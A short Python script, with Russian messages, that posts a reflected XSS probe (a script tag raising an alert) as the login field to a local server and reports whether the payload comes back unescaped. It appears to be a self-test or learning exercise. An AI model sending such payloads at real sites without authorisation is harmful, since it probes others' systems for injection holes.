import requests

url = "http://localhost:8000"

xss_data = {
    'login': "<script>alert('Уязвимость XSS найдена!');</script>",
    'password': "1",
}

response = requests.post(url, data = xss_data)

if xss_data['login'] in response.text:
    print("XSS атака сработала!")
    print(response.text.strip())
else:
    print("XSS атака не сработала!")
    print(response.text.strip())
